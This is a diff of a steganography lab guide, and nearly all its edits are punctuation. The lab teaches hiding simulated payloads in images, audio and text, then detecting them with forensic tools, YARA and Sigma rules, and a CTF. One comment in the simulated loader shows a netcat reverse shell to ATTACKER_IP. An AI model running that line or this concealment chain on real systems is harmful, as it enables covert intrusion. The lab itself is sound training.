@@ -1,9 +1,3 @@
-<div align="center">
-  <img src="https://github.com/uzairshahidgithub/STEGO-GHOST-Advanced-Steganography-Payload-Concealment-Detection/blob/main/MITRE-Lab-Daigram.png?raw=true" 
-       alt="MITRE Lab Diagram" 
-       width="600"/>
-</div>
-
 ## Prerequisites
 
 Before starting this lab you must be comfortable with:
@@ -16,6 +10,12 @@ Before starting this lab you must be comfortable with:
 
 If you cannot meet all prerequisites, complete **TryHackMe: CC: Pen Testing** and **Linux Fundamentals** paths first.
 
+<div align="center">
+  <img src="https://github.com/uzairshahidgithub/STEGO-GHOST-Advanced-Steganography-Payload-Concealment-Detection/blob/main/MITRE-Lab-Daigram.png?raw=true" 
+       alt="MITRE Lab Diagram" 
+       width="600"/>
+</div>
+
 ## Environment Setup
 
 ### Kali Linux
@@ -27,7 +27,7 @@ sudo apt update && sudo apt upgrade -y
 # Install core stego tools
 sudo apt install -y steghide zsteg outguess stegosuite exiftool binwalk strings file python3 python3-pip
 
-# Install stegsolve (Java-based — download manually)
+# Install stegsolve (Java-based: download manually)
 wget https://github.com/zardus/ctf-tools/raw/master/stegsolve/install -O install_stegsolve.sh
 bash install_stegsolve.sh
 
@@ -52,13 +52,13 @@ python3 --version
 
 Download and install the following (all free):
 
-1. **OpenStego** — [https://www.openstego.com](https://www.openstego.com) — GUI stego tool for PNG
-2. **snow.exe** — [http://www.darkside.com.au/snow](http://www.darkside.com.au/snow) — whitespace stego for text files
-3. **DeepSound** — [https://jpinsoft.net/deepsound](https://jpinsoft.net/deepsound) — audio steganography
-4. **Sysinternals Suite** — [https://docs.microsoft.com/sysinternals](https://docs.microsoft.com/sysinternals) — strings.exe, sigcheck.exe
-5. **CyberChef** — [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) — runs in browser, no install
-6. **HxD Hex Editor** — [https://mh-nexus.de/en/hxd](https://mh-nexus.de/en/hxd) — binary inspection
-7. **Python 3.x for Windows** — [https://www.python.org/downloads](https://www.python.org/downloads)
+1. **OpenStego**: [https://www.openstego.com](https://www.openstego.com): GUI stego tool for PNG
+2. **snow.exe**: [http://www.darkside.com.au/snow](http://www.darkside.com.au/snow): whitespace stego for text files
+3. **DeepSound**: [https://jpinsoft.net/deepsound](https://jpinsoft.net/deepsound): audio steganography
+4. **Sysinternals Suite**: [https://docs.microsoft.com/sysinternals](https://docs.microsoft.com/sysinternals): strings.exe, sigcheck.exe
+5. **CyberChef**: [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef): runs in browser, no install
+6. **HxD Hex Editor**: [https://mh-nexus.de/en/hxd](https://mh-nexus.de/en/hxd): binary inspection
+7. **Python 3.x for Windows**: [https://www.python.org/downloads](https://www.python.org/downloads)
 
 ### Sample Images
 
@@ -68,7 +68,7 @@ mkdir ~/stego_lab && cd ~/stego_lab
 
 wget -O cover_photo.jpg "https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/280px-PNG_transparency_demonstration_1.png"
 
-# Or use your own — any JPEG (for steghide) or PNG (for zsteg) works
+# Or use your own: any JPEG (for steghide) or PNG (for zsteg) works
 # Recommended: use a high-resolution JPEG (>500KB) for realistic payload capacity
 
 # Create working directories
@@ -95,9 +95,9 @@ mkdir -p ~/stego_lab/{payloads,images,audio,output,forensics,flags}
 | `foremost` | Any binary/disk | File carving by header/footer |
 
 
-## Phase 0 — TryHackMe Pre-Lab Rooms
+## Phase 0: TryHackMe Pre-Lab Rooms
 
-Complete these rooms **in order** before the main lab tasks. Extract the specific skill listed from each room — do not just chase flags mindlessly.
+Complete these rooms **in order** before the main lab tasks. Extract the specific skill listed from each room: do not just chase flags mindlessly.
 
 ### Room 1: Unstable Twin
 **URL:** [https://tryhackme.com/room/unstabletwin](https://tryhackme.com/room/unstabletwin)
@@ -116,7 +116,7 @@ Complete these rooms **in order** before the main lab tasks. Extract the specifi
 ### Room 2: Psychobreak
 **URL:** [https://tryhackme.com/room/psychobreak](https://tryhackme.com/room/psychobreak)
 
-**Learning Objective:** Multi-layer puzzle with encoding stacked on top of steganography. This room trains you to resist the instinct to jump straight to tools — context analysis first, tool selection second.
+**Learning Objective:** Multi-layer puzzle with encoding stacked on top of steganography. This room trains you to resist the instinct to jump straight to tools: context analysis first, tool selection second.
 
 **Skills to Extract:**
 - Recognising when Base64/ROT13/hex encoding wraps stego output
@@ -141,22 +141,22 @@ Complete these rooms **in order** before the main lab tasks. Extract the specifi
 
 
 
-## Phase 1 — LSB Steganography Theory (Mandatory Read)
+## Phase 1: LSB Steganography Theory (Mandatory Read)
 
 ### How LSB Works
 
-Every pixel in a digital image is stored as a combination of colour channels. A standard 24-bit RGB pixel uses 8 bits per channel (Red, Green, Blue). The **Least Significant Bit** of each byte contributes only a 1/255 change to colour value — invisible to the human eye.
+Every pixel in a digital image is stored as a combination of colour channels. A standard 24-bit RGB pixel uses 8 bits per channel (Red, Green, Blue). The **Least Significant Bit** of each byte contributes only a 1/255 change to colour value: invisible to the human eye.
 
 ```
 Original pixel Red channel:  10110110  (182)
 Modified pixel Red channel:  10110111  (183)  ← 1-bit change, imperceptible
 ```
 
-Across an image of 1920x1080 pixels with 3 channels, you have **6,220,800 available LSBs** — approximately **777,600 bytes** (~759 KB) of hidden capacity without visible distortion.
+Across an image of 1920x1080 pixels with 3 channels, you have **6,220,800 available LSBs**: approximately **777,600 bytes** (~759 KB) of hidden capacity without visible distortion.
 
 ### Statistical Detection
 
-LSB manipulation creates a detectable statistical signature: the distribution of 0s and 1s in the LSB plane becomes unnaturally uniform. Tools like `zsteg` and `stegsolve` exploit this. This is why high-quality stego tools (like `steghide`) add noise and use DCT-domain embedding in JPEG rather than raw LSB — harder to detect statistically.
+LSB manipulation creates a detectable statistical signature: the distribution of 0s and 1s in the LSB plane becomes unnaturally uniform. Tools like `zsteg` and `stegsolve` exploit this. This is why high-quality stego tools (like `steghide`) add noise and use DCT-domain embedding in JPEG rather than raw LSB: harder to detect statistically.
 
 ### Key Principle for Advanced Students
 
@@ -168,21 +168,21 @@ Know **why** the tool works, not just **that** it works.
 
 
 
-## Phase 2 — Offensive Operations (Kali Linux)
+## Phase 2: Offensive Operations (Kali Linux)
 
-### Task 2.1 — Prepare Simulated Payload
+### Task 2.1: Prepare Simulated Payload
 
-For this lab the "payload" is a **simulated command** representing what an attacker might conceal. This is not functional malware — it is a demonstration of concealment methodology used in defensive training.
+For this lab the "payload" is a **simulated command** representing what an attacker might conceal. This is not functional malware: it is a demonstration of concealment methodology used in defensive training.
 
 ```bash
 cd ~/stego_lab/payloads
 
-# Create simulated attacker payload (plaintext command — not executable malware)
+# Create simulated attacker payload (plaintext command: not executable malware)
 cat > stage2_command.txt << 'EOF'
 #!/bin/bash
-# SIMULATED ATTACKER STAGE-2 LOADER — FOR EDUCATIONAL USE ONLY
+# SIMULATED ATTACKER STAGE-2 LOADER: FOR EDUCATIONAL USE ONLY
 # In a real attack this would be: nc -e /bin/bash ATTACKER_IP 4444
-# This script only prints to stdout — no network activity
+# This script only prints to stdout: no network activity
 echo "[STEGO-GHOST] Payload extracted successfully"
 echo "[STEGO-GHOST] Simulated C2 beacon: 192.168.56.100:4444"
 echo "[STEGO-GHOST] Attacker stage-2 command received via steganographic channel"
@@ -201,11 +201,11 @@ echo "Encoded payload:"
 cat stage2_encoded.b64
 ```
 
-> **Why Base64 first?** Attackers encode before embedding for two reasons: (1) binary data may corrupt some stego tool outputs, and (2) a defender extracting the stego container sees apparent garbage rather than a readable script — adding a second detection layer to bypass.
+> **Why Base64 first?** Attackers encode before embedding for two reasons: (1) binary data may corrupt some stego tool outputs, and (2) a defender extracting the stego container sees apparent garbage rather than a readable script: adding a second detection layer to bypass.
 
 
 
-### Task 2.2 — Steghide: JPEG Concealment (Kali)
+### Task 2.2: Steghide: JPEG Concealment (Kali)
 
 ```bash
 cd ~/stego_lab
@@ -236,11 +236,11 @@ md5sum images/cover_stego.jpg
 steghide info images/cover_stego.jpg -p "STEGO_GHOST_2024"
 ```
 
-> **Expected Output:** steghide should confirm embedded file name, size and encryption type. If it prompts for a passphrase and accepts it — embed was successful.
+> **Expected Output:** steghide should confirm embedded file name, size and encryption type. If it prompts for a passphrase and accepts it: embed was successful.
 
 
 
-### Task 2.3 — Extraction Simulation (Victim Side)
+### Task 2.3: Extraction Simulation (Victim Side)
 
 ```bash
 # Simulate victim machine receiving and "triggering" the stego image
@@ -264,7 +264,7 @@ cat output/decoded_stage2.sh
 ```
 
 ```bash
-# Step 3: Simulate execution (safe — only prints)
+# Step 3: Simulate execution (safe: only prints)
 bash output/decoded_stage2.sh
 ```
 
@@ -272,12 +272,12 @@ bash output/decoded_stage2.sh
 
 ---
 
-### Task 2.4 — zsteg: PNG Concealment (Kali)
+### Task 2.4: zsteg: PNG Concealment (Kali)
 
 ```bash
 cd ~/stego_lab
 
-# Acquire a PNG cover image (must be PNG — zsteg does NOT work on JPEG)
+# Acquire a PNG cover image (must be PNG: zsteg does NOT work on JPEG)
 wget -O images/cover_png_clean.png "https://www.w3schools.com/css/img_5terre.jpg" 2>/dev/null || \
   convert images/cover_clean.jpg images/cover_png_clean.png
 
@@ -286,7 +286,7 @@ echo "CIPHER{zsteg_lsb_png_channel_red}" > payloads/lsb_flag.txt
 
 # Embed using zsteg (writes directly into LSB plane)
 zsteg -E "b1,rgb,lsb,xy" images/cover_png_clean.png > /dev/null 2>&1
-# Note: For writing, we use Python PIL — zsteg is primarily a READ/DETECT tool
+# Note: For writing, we use Python PIL: zsteg is primarily a READ/DETECT tool
 
 python3 << 'PYEOF'
 from PIL import Image
@@ -335,11 +335,11 @@ zsteg -E "b1,rgb,lsb,xy" images/cover_png_stego.png | strings | head -5
 
 ---
 
-### Task 2.5 — HTTP Delivery Simulation
+### Task 2.5: HTTP Delivery Simulation
 
 This simulates the attacker hosting the stego image on a web server and the victim downloading it.
 
-**Attacker machine (Kali — Terminal 1):**
+**Attacker machine (Kali: Terminal 1):**
 
 ```bash
 cd ~/stego_lab/images
@@ -351,7 +351,7 @@ python3 -m http.server 8080
 hostname -I | awk '{print $1}'
 ```
 
-**Victim machine (Kali — Terminal 2, or second VM):**
+**Victim machine (Kali: Terminal 2, or second VM):**
 
 ```bash
 # Simulate victim downloading the carrier image
@@ -365,7 +365,7 @@ ls -lh /tmp/myselfie.jpg
 md5sum /tmp/myselfie.jpg
 ```
 
-**Network capture (Kali — Terminal 3, run BEFORE download):**
+**Network capture (Kali: Terminal 3, run BEFORE download):**
 
 ```bash
 # Capture the delivery traffic for forensic analysis in Phase 5
@@ -376,12 +376,12 @@ sudo tcpdump -i eth0 -w ~/stego_lab/forensics/delivery_capture.pcap port 8080
 
 ---
 
-### Task 2.6 — outguess: JPEG Statistical Stego
+### Task 2.6: outguess: JPEG Statistical Stego
 
 ```bash
 cd ~/stego_lab
 
-# outguess uses DCT domain — statistically harder to detect than raw LSB
+# outguess uses DCT domain: statistically harder to detect than raw LSB
 echo "CIPHER{outguess_dct_domain_harder_to_detect}" > payloads/outguess_flag.txt
 
 # Embed
@@ -405,13 +405,13 @@ cat output/outguess_extracted.txt
 
 
 
-## Phase 3 — Custom Secret Encoding Language (Python3)
+## Phase 3: Custom Secret Encoding Language (Python3)
 
 ### Background
 
 Cicada 3301 and many real APT groups use **custom substitution systems** layered on top of steganography. This phase builds a reusable cipher system, embeds it in an image and requires the student to reverse-engineer both layers without the key.
 
-### Task 3.1 — Design the CIPHER Alphabet
+### Task 3.1: Design the CIPHER Alphabet
 
 The CIPHER alphabet is a 26-character substitution cipher with numeric padding for non-alpha characters.
 
@@ -420,11 +420,11 @@ Standard:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
 CIPHER:    Q W E R T Y U I O P A S D F G H J K L Z X C V B N M
 ```
 
-Save this mapping as your **Lab Key** — you will need it for encoding and decoding.
+Save this mapping as your **Lab Key**: you will need it for encoding and decoding.
 
 
 
-### Task 3.2 — Encoder/Decoder Script
+### Task 3.2: Encoder/Decoder Script
 
 Save the following as `~/stego_lab/cipher_codec.py`:
 
@@ -432,7 +432,7 @@ Save the following as `~/stego_lab/cipher_codec.py`:
 #!/usr/bin/env python3
 """
 CIPHER Custom Substitution Codec
-Lab: STEGO GHOST — Advanced Steganography
+Lab: STEGO GHOST: Advanced Steganography
 Usage: python3 cipher_codec.py [encode|decode] "your text here"
 """
 
@@ -452,7 +452,7 @@ DECODE_MAP = dict(zip(CIPHER_A, STANDARD))
 NUM_ENCODE = {str(i): str((i + 3) % 10) for i in range(10)}
 NUM_DECODE = {v: k for k, v in NUM_ENCODE.items()}
 
-# Special marker — wraps the ciphertext to identify CIPHER-encoded content
+# Special marker: wraps the ciphertext to identify CIPHER-encoded content
 PREFIX  = ">>CIPHERSTART<<"
 SUFFIX  = ">>CIPHEREND<<"
 
@@ -484,7 +484,7 @@ def decode(ciphertext: str) -> str:
     try:
         raw = base64.b64decode(inner.encode()).decode()
     except Exception:
-        raw = inner   # Already raw cipher — skip b64 step
+        raw = inner   # Already raw cipher: skip b64 step
     result = []
     for char in raw:
         if char in DECODE_MAP:
@@ -531,7 +531,7 @@ python3 ~/stego_lab/cipher_codec.py decode ">>CIPHERSTART<<PASTE_OUTPUT_HERE>>CI
 
 
 
-### Task 3.3 — Stacked Concealment: Cipher + Steghide
+### Task 3.3: Stacked Concealment: Cipher + Steghide
 
 ```bash
 cd ~/stego_lab
@@ -554,7 +554,7 @@ echo "Dual-layer stego image created"
 ```
 
 ```bash
-# Extraction challenge — reverse BOTH layers
+# Extraction challenge: reverse BOTH layers
 # Layer 1: steghide extract
 steghide extract \
   -sf images/cover_dual_layer.jpg \
@@ -571,7 +571,7 @@ python3 cipher_codec.py decode "$(cat output/layer1_extracted.txt)"
 
 
 
-### Task 3.4 — Whitespace Steganography with snow (Kali)
+### Task 3.4: Whitespace Steganography with snow (Kali)
 
 `snow` conceals messages by appending invisible tabs and spaces to lines of text. The cover "text file" looks empty or normal in any text editor.
 
@@ -609,16 +609,16 @@ snow -C -p "snow_pass_2024" output/readme_stego.txt
 
 
 
-## Phase 4 — Windows Steganography Tools
+## Phase 4: Windows Steganography Tools
 
 Complete these tasks on your Windows VM. Document each with a screenshot.
 
-### Task 4.1 — OpenStego GUI (Windows — PNG only)
+### Task 4.1: OpenStego GUI (Windows: PNG only)
 
 1. Launch OpenStego
 2. Navigate to **Hide Data** tab
 3. **Message File:** Browse to a `.txt` file containing `CIPHER{openstego_windows_png_embed}`
-4. **Cover File:** Select any `.png` image (JPEG will be rejected — OpenStego is PNG-only)
+4. **Cover File:** Select any `.png` image (JPEG will be rejected: OpenStego is PNG-only)
 5. **Output Stego File:** Save as `output_stego.png` on your Desktop
 6. **Password:** `openstego_2024`
 7. Click **Hide Data**
@@ -628,20 +628,20 @@ Complete these tasks on your Windows VM. Document each with a screenshot.
 1. Navigate to **Unhide Data** tab
 2. **Input Stego File:** Select `output_stego.png`
 3. **Password:** `openstego_2024`
-4. Click **Unhide Data** — extracted file saves to output directory
+4. Click **Unhide Data**: extracted file saves to output directory
 5. Open extracted file and record the flag
 
 > **Flag 5 location:** Extracted text file content from OpenStego. Record: `CIPHER{openstego_windows_png_embed}`
 
 ---
 
-### Task 4.2 — DeepSound: Audio Steganography (Windows)
+### Task 4.2: DeepSound: Audio Steganography (Windows)
 
 1. Launch DeepSound
-2. Click **Open carrier files** — select any `.wav` or `.mp3` file
-3. Navigate to **Add secret files** — add a `.txt` file containing `CIPHER{deepsound_audio_covert_channel}`
-4. Tick **Encrypt secret files** — password: `audio_stego_2024`
-5. Click **Encode secret files** — save output as `audio_stego.wav`
+2. Click **Open carrier files**: select any `.wav` or `.mp3` file
+3. Navigate to **Add secret files**: add a `.txt` file containing `CIPHER{deepsound_audio_covert_channel}`
+4. Tick **Encrypt secret files**: password: `audio_stego_2024`
+5. Click **Encode secret files**: save output as `audio_stego.wav`
 
 **Extraction:**
 
@@ -653,7 +653,7 @@ Complete these tasks on your Windows VM. Document each with a screenshot.
 > **Flag 6 location:** Extracted text file from DeepSound. Record: `CIPHER{deepsound_audio_covert_channel}`
 
 
-### Task 4.3 — snow.exe: Whitespace Stego (Windows CMD)
+### Task 4.3: snow.exe: Whitespace Stego (Windows CMD)
 
 ```cmd
 REM Open Command Prompt in the snow.exe directory
@@ -676,13 +676,13 @@ snow.exe -C -p "snow_win_2024" output_snow.txt
 
 
 
-### Task 4.4 — HxD Hex Editor: Manual Inspection (Windows)
+### Task 4.4: HxD Hex Editor: Manual Inspection (Windows)
 
 1. Open `cover_stego.jpg` (transferred from Kali) in HxD
 2. Jump to the **end of file** (Ctrl+End)
 3. Look for data **after** the JPEG end-of-file marker `FF D9`
-4. Any data present after `FF D9` is appended content — a common naive hiding technique
-5. Document what you observe (even if nothing is present — "no appended data" is a valid finding)
+4. Any data present after `FF D9` is appended content: a common naive hiding technique
+5. Document what you observe (even if nothing is present: "no appended data" is a valid finding)
 
 **Compare using strings (Sysinternals):**
 
@@ -694,9 +694,9 @@ REM Look for: base64 strings, URLs, script fragments, readable sentences
 ```
 
 
-## Phase 5 — Defensive Detection & Forensic Analysis
+## Phase 5: Defensive Detection & Forensic Analysis
 
-### Task 5.1 — File Analysis with ExifTool
+### Task 5.1: File Analysis with ExifTool
 
 ```bash
 cd ~/stego_lab
@@ -725,7 +725,7 @@ diff /tmp/meta_clean.txt /tmp/meta_stego.txt
 
 
 
-### Task 5.2 — Entropy Analysis with binwalk
+### Task 5.2: Entropy Analysis with binwalk
 
 ```bash
 cd ~/stego_lab
@@ -752,11 +752,11 @@ ls -la forensics/binwalk_carved/
 | 0.0 – 0.4 | Mostly null bytes or repetitive data |
 | 0.5 – 0.8 | Normal uncompressed data |
 | 0.8 – 0.95 | Compressed image (JPEG/PNG normal range) |
-| 0.95 – 1.0 | **Encrypted or heavily obfuscated — investigate** |
+| 0.95 – 1.0 | **Encrypted or heavily obfuscated: investigate** |
 
 
 
-### Task 5.3 — String Analysis
+### Task 5.3: String Analysis
 
 ```bash
 cd ~/stego_lab
@@ -783,7 +783,7 @@ strings images/cover_stego.jpg | grep -E '(CIPHERSTART|CIPHEREND|FLAG|CIPHER\{)'
 
 
 
-### Task 5.4 — stegsolve Bit-Plane Analysis (Kali GUI)
+### Task 5.4: stegsolve Bit-Plane Analysis (Kali GUI)
 
 ```bash
 # Launch stegsolve
@@ -792,17 +792,17 @@ java -jar /opt/stegsolve/stegsolve.jar
 
 1. File > Open > select `cover_png_stego.png`
 2. Use **left/right arrows** to cycle through bit planes
-3. Stop at **Red plane 0** (LSB of red channel) — stego data appears as noise pattern
+3. Stop at **Red plane 0** (LSB of red channel): stego data appears as noise pattern
 4. Compare to `cover_png_clean.png` in a second stegsolve window
 5. Go to **Analyse > Data Extract**
-6. Tick: Red 0, Green 0, Blue 0 — Order: Row by Row, MSB First unchecked
-7. Click **Preview** — look for readable text in the hex dump
+6. Tick: Red 0, Green 0, Blue 0: Order: Row by Row, MSB First unchecked
+7. Click **Preview**: look for readable text in the hex dump
 
 **What you are looking for:** A consistent noise pattern in bit-plane 0 indicating non-random LSB data (steganographic signature).
 
 
 
-### Task 5.5 — stegoVeritas Full Scan
+### Task 5.5: stegoVeritas Full Scan
 
 ```bash
 cd ~/stego_lab
@@ -819,7 +819,7 @@ ls forensics/stegoveritas_results/
 
 ---
 
-### Task 5.6 — PCAP Analysis (Wireshark)
+### Task 5.6: PCAP Analysis (Wireshark)
 
 ```bash
 # Analyse the delivery capture from Phase 2 Task 2.5
@@ -845,7 +845,7 @@ tshark -r ~/stego_lab/forensics/delivery_capture.pcap \
 
 
 
-### Task 5.7 — YARA Detection Rule
+### Task 5.7: YARA Detection Rule
 
 Write a YARA rule that detects steghide-embedded JPEG images by hunting for the steghide signature string and statistical anomalies.
 
@@ -854,9 +854,9 @@ Save as `~/stego_lab/forensics/stego_detect.yar`:
 ```yara
 /*
    YARA Rule: Detect steghide-embedded JPEG images
-   Author: CIPHER Lab — STEGO GHOST
+   Author: CIPHER Lab: STEGO GHOST
    Date: 2024
-   Ref: T1027.003 — Steganography
+   Ref: T1027.003: Steganography
    Version: 1.0
 */
 
@@ -873,7 +873,7 @@ rule steghide_embedded_jpeg
         $steghide_magic  = { 73 74 65 67 68 64 }   // 'steghd' hex
         $steghide_string = "steghide"  ascii nocase
 
-        // Base64 content pattern — indicates encoded payload
+        // Base64 content pattern: indicates encoded payload
         $base64_pattern  = /[A-Za-z0-9+\/]{40,}={0,2}/ ascii
 
         // CIPHER codec markers
@@ -899,7 +899,7 @@ rule steghide_embedded_jpeg
 rule suspicious_image_size_anomaly
 {
     meta:
-        description  = "JPEG with size disproportionate to dimensions — possible stego carrier"
+        description  = "JPEG with size disproportionate to dimensions: possible stego carrier"
         author       = "CIPHER Lab"
         mitre_attack = "T1027.003"
         severity     = "Low"
@@ -918,12 +918,12 @@ rule suspicious_image_size_anomaly
 rule snow_whitespace_stego_textfile
 {
     meta:
-        description = "Text file with suspicious trailing whitespace on multiple lines — possible snow stego"
+        description = "Text file with suspicious trailing whitespace on multiple lines: possible snow stego"
         author      = "CIPHER Lab"
         mitre_attack = "T1027.003"
 
     strings:
-        // Trailing tab characters on line endings — snow signature
+        // Trailing tab characters on line endings: snow signature
         $trailing_tab1 = /\t\t\t\n/
         $trailing_tab2 = /[ \t]{4,}\n/
 
@@ -946,7 +946,7 @@ yara ~/stego_lab/forensics/stego_detect.yar images/cover_clean.jpg
 
 
 
-### Task 5.8 — Sigma Rule (SIEM Detection)
+### Task 5.8: Sigma Rule (SIEM Detection)
 
 Write a Sigma rule for detecting suspicious image downloads followed by script execution.
 
@@ -960,7 +960,7 @@ description: >
   Detects a pattern consistent with steganographic payload delivery:
   an image file is downloaded via HTTP and within 60 seconds a shell
   or script interpreter executes. Maps to T1027.003 + T1059.
-author: CIPHER Lab — STEGO GHOST
+author: CIPHER Lab: STEGO GHOST
 date: 2024/01/01
 references:
   - https://attack.mitre.org/techniques/T1027/003/
@@ -1009,7 +1009,7 @@ fields:
 
 
 
-## Phase 6 — Independent CTF Challenge (Timed — 90 Minutes)
+## Phase 6: Independent CTF Challenge (Timed: 90 Minutes)
 
 > **Rules:** No hints until time expires. No collaboration. Work independently. Submit all flags plus a 1-page analysis report.
 
@@ -1020,18 +1020,18 @@ fields:
 ```bash
 cd ~/stego_lab
 
-# Download challenge package (instructor provides — or create your own below)
+# Download challenge package (instructor provides: or create your own below)
 # For self-study: create the challenge package yourself FIRST then attempt it
 # from scratch in a clean directory one week later
 
 mkdir challenge && cd challenge
 
 # Instructor deploys three files:
-#   ghost_01.jpg   — contains Flag A (steghide + CIPHER encoded)
-#   ghost_02.png   — contains Flag B (LSB manual + outguess layered)
-#   ghost_03.wav   — contains Flag C (audio stego + snow encoded text)
-#   readme.txt     — contains Flag D (snow whitespace stego)
-#   manifest.txt   — cipher-encoded clue pointing to master flag location
+#   ghost_01.jpg  : contains Flag A (steghide + CIPHER encoded)
+#   ghost_02.png  : contains Flag B (LSB manual + outguess layered)
+#   ghost_03.wav  : contains Flag C (audio stego + snow encoded text)
+#   readme.txt    : contains Flag D (snow whitespace stego)
+#   manifest.txt  : cipher-encoded clue pointing to master flag location
 ```
 
 ### Challenge Flags
@@ -1058,7 +1058,7 @@ Answer all five questions in your incident report:
 
 ## Deliverables Checklist
 
-Submit all the following as a single PDF document. Screenshots must show your THM profile username, terminal hostname and full browser tab — no crops, no edits, no AI-generated images.
+Submit all the following as a single PDF document. Screenshots must show your THM profile username, terminal hostname and full browser tab: no crops, no edits, no AI-generated images.
 
 | # | Deliverable | Phase |
 |---|---|---|
@@ -1067,7 +1067,7 @@ Submit all the following as a single PDF document. Screenshots must show your TH
 | 3 | THM: Cicada 3301 Vol 1 completion screenshot | Phase 0 |
 | 4 | steghide embed/extract terminal output (Kali) | Phase 2 |
 | 5 | zsteg PNG detection output | Phase 2 |
-| 6 | HTTP delivery PCAP — Wireshark screenshot | Phase 2 |
+| 6 | HTTP delivery PCAP: Wireshark screenshot | Phase 2 |
 | 7 | CIPHER codec encode + decode terminal output | Phase 3 |
 | 8 | Dual-layer stego chain (cipher + steghide) output | Phase 3 |
 | 9 | snow whitespace stego embed + extract (Kali) | Phase 3 |
@@ -1078,7 +1078,7 @@ Submit all the following as a single PDF document. Screenshots must show your TH
 | 14 | exiftool diff output (clean vs stego) | Phase 5 |
 | 15 | binwalk entropy graph screenshot | Phase 5 |
 | 16 | stegsolve bit-plane screenshot (Red plane 0) | Phase 5 |
-| 17 | YARA rule output — match on stego, silent on clean | Phase 5 |
+| 17 | YARA rule output: match on stego, silent on clean | Phase 5 |
 | 18 | All 5 CTF challenge flags | Phase 6 |
 | 19 | 1-page incident report answering all 5 questions | Phase 6 |
 
@@ -1086,7 +1086,7 @@ Submit all the following as a single PDF document. Screenshots must show your TH
 
 ## Tiered Hint System
 
-### Phase 2 — Steghide
+### Phase 2: Steghide
 
 > **Hint 1 (Beginner):** The passphrase is mentioned in the task instructions. Re-read carefully.
 >
@@ -1096,33 +1096,33 @@ Submit all the following as a single PDF document. Screenshots must show your TH
 
 ---
 
-### Phase 3 — CIPHER Codec
+### Phase 3: CIPHER Codec
 
 > **Hint 1 (Beginner):** The CIPHER alphabet is a substitution table. Every letter maps to exactly one other letter. Look for the decode map in the codec script.
 >
 > **Hint 2 (Intermediate):** The output has two layers: Base64 wrapping the substitution cipher. Reverse Base64 first, then apply the decode map.
 >
-> **Hint 3 (Advanced):** `python3 cipher_codec.py decode "PASTE_FULL_STRING_INCLUDING_MARKERS"` — the markers `>>CIPHERSTART<<` and `>>CIPHEREND<<` must be included for the script to parse correctly.
+> **Hint 3 (Advanced):** `python3 cipher_codec.py decode "PASTE_FULL_STRING_INCLUDING_MARKERS"`: the markers `>>CIPHERSTART<<` and `>>CIPHEREND<<` must be included for the script to parse correctly.
 
 ---
 
-### Phase 5 — YARA Rule
+### Phase 5: YARA Rule
 
-> **Hint 1 (Beginner):** YARA matches on byte patterns. Think about what bytes steghide always writes into a JPEG — is there a consistent string or hex sequence?
+> **Hint 1 (Beginner):** YARA matches on byte patterns. Think about what bytes steghide always writes into a JPEG: is there a consistent string or hex sequence?
 >
-> **Hint 2 (Intermediate):** Run `strings images/cover_stego.jpg | grep -i steg` — whatever appears consistently in embedded files is your YARA string candidate.
+> **Hint 2 (Intermediate):** Run `strings images/cover_stego.jpg | grep -i steg`: whatever appears consistently in embedded files is your YARA string candidate.
 >
 > **Hint 3 (Advanced):** The YARA `condition` block can combine multiple strings with `and`/`or`. A rule that fires on one indicator has high false positives. Combine: file format check + stego string + anomalous file size for a high-confidence detection.
 
 ---
 
-### Phase 6 — CTF Challenge
+### Phase 6: CTF Challenge
 
-> **Hint 1 (Beginner — unlock after 30 min):** Start with `file`, `strings` and `exiftool` on every challenge file before using any stego tool. The tool to use is usually revealed by the file type.
+> **Hint 1 (Beginner: unlock after 30 min):** Start with `file`, `strings` and `exiftool` on every challenge file before using any stego tool. The tool to use is usually revealed by the file type.
 >
-> **Hint 2 (Intermediate — unlock after 60 min):** Flag B uses two stego layers. Extract the first with zsteg, then run the output through outguess. The passphrase for both layers follows the same pattern as the lab tasks.
+> **Hint 2 (Intermediate: unlock after 60 min):** Flag B uses two stego layers. Extract the first with zsteg, then run the output through outguess. The passphrase for both layers follows the same pattern as the lab tasks.
 >
-> **Hint 3 (Advanced — unlock after 90 min):** The master flag is not hidden in any single file. Concatenate Flags A, B, C and D, then run the combined string through the CIPHER decoder.
+> **Hint 3 (Advanced: unlock after 90 min):** The master flag is not hidden in any single file. Concatenate Flags A, B, C and D, then run the combined string through the CIPHER decoder.
 
 ---
 
@@ -1140,7 +1140,7 @@ Submit all the following as a single PDF document. Screenshots must show your TH
 
 ---
 
-## Reference — Key Commands Summary
+## Reference: Key Commands Summary
 
 ```bash
 # EMBED
@@ -1172,7 +1172,7 @@ yara rules.yar stego.jpg
 ## Tool Install Reference (Quick Copy-Paste)
 
 ```bash
-# All tools — single command
+# All tools: single command
 sudo apt install -y steghide zsteg outguess stegosuite exiftool binwalk \
   foremost pngcheck ffmpeg snow file python3 python3-pip && \
 pip3 install stegoveritas Pillow && \
